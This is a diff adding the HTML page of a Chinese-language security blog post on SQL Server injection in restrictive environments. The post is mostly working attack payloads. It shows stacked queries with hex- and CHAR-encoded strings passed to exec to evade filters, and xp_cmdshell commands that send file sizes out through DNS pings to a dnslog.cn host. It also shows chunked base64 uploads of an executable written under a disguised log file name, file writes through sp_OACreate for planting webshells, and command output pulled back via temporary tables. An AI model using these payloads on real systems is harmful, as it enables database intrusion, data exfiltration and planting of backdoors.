@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>苛刻环境下mssql注入 | hungry and humble</title>
+    
+    
+        <meta name="keywords" content="注入" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前提是bda权限或者是dbo权限 绕过支持堆叠的情况下支持declare就可以基本绕过，execute或者exec函数禁用可以通过ex1ecute绕过 123select * from admin where id &#x3D;1;declare @s varchar(2000) set @s&#x3D;0x73656c65637420636f6e7665727428696e742c404076657273696f6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="苛刻环境下mssql注入">
+<meta property="og:url" content="https://little-gu.github.io/2021/12/05/%E8%8B%9B%E5%88%BB%E7%8E%AF%E5%A2%83%E4%B8%8Bmssql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="hungry and humble">
+<meta property="og:description" content="前提是bda权限或者是dbo权限 绕过支持堆叠的情况下支持declare就可以基本绕过，execute或者exec函数禁用可以通过ex1ecute绕过 123select * from admin where id &#x3D;1;declare @s varchar(2000) set @s&#x3D;0x73656c65637420636f6e7665727428696e742c404076657273696f6">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-12-05T05:03:07.000Z">
+<meta property="article:modified_time" content="2021-12-05T06:26:27.164Z">
+<meta property="article:author" content="G7shot">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="hungry and humble" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/ckrie.jpg" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">hungry and humble</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">index</a>
+                
+                    <a class="main-nav-link" href="/archives">archives</a>
+                
+                    <a class="main-nav-link" href="/about">about</a>
+                
+                    <a class="main-nav-link" href="/notes">notes</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">index</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">archives</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">about</a></td>
+                
+                    <td><a class="main-nav-link" href="/notes">notes</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            .net
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/25/viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98/">viewstate反序列化实战</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            PHP代码审计
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/02/13/zzzcms/">zzzcms前台RCE</a></li>  <li class="file"><a href="/2020/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">审计某cms到insert注入技巧</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Python
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/12/02/github%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E6%B5%8B%E8%AF%95/">github泄露工具测试</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            java
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/02/16/cc1%E9%93%BE/">cc1链</a></li>  <li class="file"><a href="/2020/03/19/cc2%E9%93%BE/">cc2链</a></li>  <li class="file"><a href="/2020/04/19/cc5%E9%93%BE/">cc5链</a></li>  <li class="file"><a href="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/">结合两条cc链分析ysoserial实现</a></li>  <li class="file"><a href="/2021/10/09/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">fastjson不出网利用</a></li>  <li class="file"><a href="/2021/12/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BF%E4%B8%8Bjava%E7%AB%99%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%A7%A3%E5%86%B3/">记一次拿下java站之后的负载均衡解决</a></li>  <li class="file"><a href="/2021/12/07/java%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">java发序列化执行任意类的利用</a></li>  <li class="file"><a href="/2022/01/08/%E5%88%A9%E7%94%A8urldns%E5%8E%9F%E7%94%9F%E9%93%BE%E6%8E%A2%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E7%9B%B8%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E9%93%BE/">利用urldns原生链探测是否存在相应版本的反序列链</a></li>  <li class="file"><a href="/2022/01/10/log4j2%E6%9D%82%E8%B0%88/">log4j2杂谈</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            注入
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/03/04/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bmssql/">攻击数据库之mssql</a></li>  <li class="file"><a href="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/">攻击数据库之db2</a></li>  <li class="file active"><a href="/2021/12/05/%E8%8B%9B%E5%88%BB%E7%8E%AF%E5%A2%83%E4%B8%8Bmssql%E6%B3%A8%E5%85%A5/">苛刻环境下mssql注入</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            渗透
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/">non-rce-ctf复现</a></li>  <li class="file"><a href="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/">记一次曲折渗透selenium-server</a></li>  <li class="file"><a href="/2021/12/03/%E5%AE%9E%E6%88%98host%E7%A2%B0%E6%92%9E%E5%88%B0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">实战host碰撞到代码审计</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/2021/02/13/test/">test</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-苛刻环境下mssql注入" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E6%B3%A8%E5%85%A5/">注入</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2021/12/05/%E8%8B%9B%E5%88%BB%E7%8E%AF%E5%A2%83%E4%B8%8Bmssql%E6%B3%A8%E5%85%A5/">
+            <time datetime="2021-12-05T05:03:07.000Z" itemprop="datePublished">2021-12-05</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/苛刻环境下mssql注入.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/苛刻环境下mssql注入.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/苛刻环境下mssql注入.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            苛刻环境下mssql注入
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <p>前提是bda权限或者是dbo权限</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>支持堆叠的情况下支持declare就可以基本绕过，execute或者exec函数禁用可以通过ex1ecute绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>;<span class="keyword">declare</span> <span class="variable">@s</span> <span class="type">varchar</span>(<span class="number">2000</span>) <span class="keyword">set</span> <span class="variable">@s</span><span class="operator">=</span><span class="number">0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span> <span class="keyword">exec</span>(<span class="variable">@s</span>)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>;<span class="keyword">declare</span> <span class="variable">@s</span> <span class="type">varchar</span>(<span class="number">2000</span>) <span class="keyword">set</span> <span class="variable">@s</span><span class="operator">=</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">118</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">114</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">40</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">44</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">64</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">64</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">118</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">114</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">41</span>) <span class="keyword">exec</span>(<span class="variable">@s</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h2 id="写文件姿势"><a href="#写文件姿势" class="headerlink" title="写文件姿势"></a>写文件姿势</h2><p>出网—-echo<br>出NDS—-压缩形式分片上传，或者certutil工具编码写dll</p>
+<ol>
+<li>echo</li>
+<li>出DNS时写马<br>1、makecab压缩 makecab httptest.exe httptest.zip<br>解压expand<br>2、kali base64 -w 4000 或者脚本分割<br>3、替换文+为%2b<br>4、burp单线程跑 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;\&quot;§-----BEGIN CERTIFICATE-----&#96;nTVqQAAMAAAAEAAAA&#x2F;&#x2F;8AALgA(base64内容)n&#x2F;§\&quot; | Out-File C:\\Windows\\Temp\\chrome_installers.log -Append&quot;</span><br></pre></td></tr></table></figure>
+5、判断文件是否成功写入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;exec+xp_cmdshell+&#39;for+%i+in+(C%3a\\Windows\\Temp\\test.zip)+do+ping+-n+1+%~zi.wwc6fh.dnslog.cn&#39;--+a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%zn</span><br><span class="line">z 大小</span><br><span class="line">n 文件个数</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line">for &#x2F;f “选项” %变量 in （ “字符串”-集 &#x2F;文件名-集&#x2F;  ‘命令&#39;-集  ） do 命令                                        </span><br><span class="line">读取文件内容:</span><br><span class="line">for &#x2F;F %i in (c:\windows\tasks\1.txt) do echo %i  </span><br><span class="line">执行命令，并读取结果:</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ&quot; %d IN (&#96;dir&#96;) DO @ECHO %d</span><br><span class="line">读取目录名称:</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ delims&#x3D;&lt;DIR&gt; tokens&#x3D;2&quot; %i in (&#96;dir c:\windows\tasks&#96;) do @ECHO %i</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ&quot; %i in (&#96;dir &#x2F;b c:\windows\tasks&#96;) do @ECHO %i  [更好]</span><br><span class="line">读取文件名:</span><br><span class="line">FOR &#x2F;F &quot;USEBACKQ tokens&#x3D;4 delims&#x3D; &quot; %c in (&#96;dir c:\windows\tasks&#96;) do @ECHO %c</span><br><span class="line">这里使用了 usebackq 参数，令执行命令用&#96;包裹。</span><br></pre></td></tr></table></figure></li>
+<li>利用存储过程<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">declare @FilePath nvarchar(400),@xmlstr varchar(8000);</span><br><span class="line">Declare @INT_ERR int;</span><br><span class="line">Declare @INT_FSO int;</span><br><span class="line">Declare @INT_OPENFILE int;</span><br><span class="line">Declare @STR_CONTENT as varchar(MAX);</span><br><span class="line">DECLARE @output varchar(255);</span><br><span class="line">DECLARE @hr int;</span><br><span class="line">DECLARE @source varchar(255);</span><br><span class="line">DECLARE @description varchar(255);</span><br><span class="line">set @FilePath &#x3D; &#39;c:&#x2F;windows&#x2F;tasks&#x2F;111.ps1&#39;;</span><br><span class="line">set @STR_CONTENT &#x3D; convert(varchar(MAX),0x313233);</span><br><span class="line">EXEC @INT_ERR &#x3D; sp_OACreate &#39;Scripting.FileSystemObject&#39;, @INT_FSO OUTPUT;</span><br><span class="line">if(@INT_ERR &lt;&gt; 0) BEGIN EXEC sp_OAGetErrorInfo @INT_FSO RETURN END;</span><br><span class="line">EXEC @INT_ERR&#x3D;SP_OAMETHOD @INT_FSO,&#39;CreateTextFile&#39;,@INT_OPENFILE OUTPUT,@FilePath;</span><br><span class="line">EXEC @INT_ERR&#x3D;SP_OAMETHOD @INT_OPENFILE,&#39;Write&#39;,null,@STR_CONTENT;</span><br><span class="line">EXEC @INT_ERR&#x3D;SP_OADESTROY @INT_OPENFILE;</span><br></pre></td></tr></table></figure>
+<h2 id="不是站库分离的情况"><a href="#不是站库分离的情况" class="headerlink" title="不是站库分离的情况"></a>不是站库分离的情况</h2></li>
+</ol>
+<p>写webshell就可以了</p>
+<ul>
+<li>绝对路径</li>
+</ul>
+<ol>
+<li><p>报错</p>
+</li>
+<li><p>创建临时表，插入查询结果</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;CREATE TABLE tt_tmp (tmp1 varchar(8000));--</span></span><br><span class="line"><span class="string">insert into tt_tmp(tmp1) exec master..xp_cmdshell &#x27;</span><span class="keyword">for</span> <span class="operator">/</span>r c:\ <span class="operator">%</span>i <span class="keyword">in</span> (ajax.asp) do <span class="variable">@echo</span> <span class="operator">%</span>i <span class="string">&#x27;;--+</span></span><br><span class="line"><span class="string">报错 &#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp)<span class="keyword">and</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a</span></span><br></pre></td></tr></table></figure>
+<h2 id="站库分离的情况"><a href="#站库分离的情况" class="headerlink" title="站库分离的情况"></a>站库分离的情况</h2></li>
+<li><p>出http或者dns时上面写文件方式写文件</p>
+</li>
+<li><p>不出网无回显带出命令执行结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create TABLE output([output][varchar](1000),ID int NOT NULL IDENTITY (1,1));</span><br><span class="line">insert output exec master.dbo.xp_cmdshell &#39;dir c:&#39;;</span><br><span class="line">select output from output where id&#x3D;1;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/2021/12/07/java%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    java发序列化执行任意类的利用
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2021/12/03/%E5%AE%9E%E6%88%98host%E7%A2%B0%E6%92%9E%E5%88%B0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">实战host碰撞到代码审计</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            G7shot &copy; 2022 
+            <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by g7shot.com</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
